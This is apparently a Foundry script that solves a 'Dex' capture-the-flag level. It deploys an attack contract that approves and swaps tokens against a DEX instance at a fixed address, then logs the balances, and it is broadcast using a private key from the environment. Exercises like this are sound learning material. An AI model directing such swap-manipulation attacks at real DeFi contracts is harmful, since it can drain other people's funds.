//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {Dex1} from "../src/Dex1.sol";


contract Dex1Attack {
 Dex1 dex1Instance = Dex1(0x2B8925fe5D2223EDa7cb8BA2fDE698A212D52fDD);

  function swap() external {
  address token1 = dex1Instance.token1();
  address token2 = dex1Instance.token2();
  dex1Instance.approve(address(dex1Instance),10);
  dex1Instance.swap(token1,token2,10);
  console.log("Balance token1 in my address",dex1Instance.balanceOf(token1,tx.origin));
  console.log("Balance token2 in my address",dex1Instance.balanceOf(token2,tx.origin));
  console.log("Balance token1 in dex1",dex1Instance.balanceOf(token1,address(dex1Instance)));
  console.log("Balance token1 in dex1",dex1Instance.balanceOf(token2,address(dex1Instance)));
  }
}

contract Dex1Solution is Script {
  
  
  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    Dex1Attack dex1AttactInstance = new Dex1Attack();
    dex1AttactInstance.swap();
    vm.stopBroadcast();
  }
}